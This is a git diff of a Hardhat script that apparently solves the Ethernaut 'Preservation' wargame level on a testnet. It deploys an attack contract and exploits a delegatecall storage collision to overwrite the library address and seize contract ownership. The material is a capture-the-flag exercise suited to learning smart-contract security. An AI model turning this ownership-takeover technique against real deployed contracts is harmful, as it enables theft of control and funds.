@@ -2,11 +2,10 @@ import { ethers } from "hardhat";
 
 async function attackPreservation() {
     // change contract addresses here.
-    const preservationAddress = "0x75597d353C2001D18560B9ac5154CCED2Be58212";
-    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here (you may type player in ethernaut console)
-    const attackLibraryAddress = "0x465e72a7d852689fd69ff17255ec8455fe29bdb8";
+    const preservationAddress = "0x62Ca466832854E54e87fAd410eDA0640756FfCa7";
+    // const player = ""; //place your player address here (you may type player in ethernaut console)
     const args: any[] = [];
-    const deployer = process.env.PRIVATE_KEY || "";
+    const player = process.env.PRIVATE_KEY || "";
     // [deployer] = await ethers.getSigners();
 
     // Don't touch below 🚀
@@ -14,15 +13,21 @@ async function attackPreservation() {
     // Additional read:
     // site here
 
+    // using my custom rpc stored in .env (for privacy)
+    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
+    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
+    const players = new ethers.Wallet(player, provider);
+    console.log("Player's address is: ", players.address);
+
     // deploying attack contract here
     // const deployed = await deployContract(hre, "AttackLibraryContract", args);
     // alternative below
     console.log("Deploying attack contract AttackLibraryContract...");
-    const Factory = await ethers.getContractFactory("AttackLibraryContract", deployer);
-    const attackLibraryContract = await Factory.deploy();
-    console.log(attackLibraryContract);
-    console.log(`Contract deployed to ${attackLibraryContract.address}`);
-    console.log("Attack contract deployed...");
+    const attack = await (
+        await ethers.getContractFactory("AttackLibraryContract", player)
+    ).deploy();
+    console.log(attack);
+    console.log(`Attack contract deployed to ${attack.address}`);
     // experimantal verify below
     // if (attackLibraryContract.address){
     //     console.log("Verifying contract...");
@@ -40,21 +45,36 @@ async function attackPreservation() {
     //     }
     // }
 
-    // no change here. attack starts here.
-    const attackPreservation = await ethers.getContractAt("Preservation", preservationAddress);
-    const oldOwner = await attackPreservation.owner();
+    // attack starts here.
+    const contract = await ethers.getContractAt("Preservation", preservationAddress);
+    const oldOwner = await contract.owner();
     console.log(`Current owner is: ${oldOwner}`);
-    console.log("Changing library to Players own contract...");
-    const tx1 = await attackPreservation.setFirstTime(attackLibraryContract.address);
-    tx1.wait(1);
-    console.log("Change library done!now setting new owner via vulnerability...");
-    const tx2 = await attackPreservation.setFirstTime(1);
-    const tx2Receipt = tx2.wait(1);
-    console.log(tx2Receipt);
-    const newOwner = ((await attackPreservation.owner()) === player).toString();
-    console.log(`Passed this level: ${newOwner}`);
-    if (newOwner) {
-        console.log("You may now submit to ethernaut");
+    const oldLibrary = await contract.timeZone1Library();
+    console.log("Current timeZone1Library is: ", oldLibrary);
+    console.log("Changing library to Players own contract and attack...");
+    //old implementation
+    // const uint256 = "0x" + "0".repeat(24) + attack.address.slice(2);
+    // console.log(`setting to ${uint256}`);
+    // const tx1 = await contract.setFirstTime(uint256);
+    // const tx1receipt = await tx1.wait(1);
+    // console.log(tx1receipt);
+    // const newLibrary = await contract.timeZone1Library();
+    // console.log("New timeZone1Library is: ", newLibrary);
+    // console.log("Change library done!now setting new owner via vulnerability...");
+    // const tx2 = await contract.setFirstTime(1);
+    // const tx2Receipt = await tx2.wait(1);
+    // console.log(tx2Receipt);
+    // new implementation
+    const tx1 = await attack.hack(preservationAddress);
+    const tx1Receipt = await tx1.wait();
+    console.log(tx1Receipt);
+    const newLibrary = await contract.timeZone1Library();
+    console.log("New timeZone1Library is: ", newLibrary);
+    const newOwner = await contract.owner();
+    const passed = (await contract.owner()) === players.address;
+    console.log(`New Owner is: ${newOwner}`);
+    if (passed) {
+        console.log("Congrats! Level Passed, You may now submit to ethernaut");
     } else {
         console.log("Player is not the owner, review code above and try again...");
     }
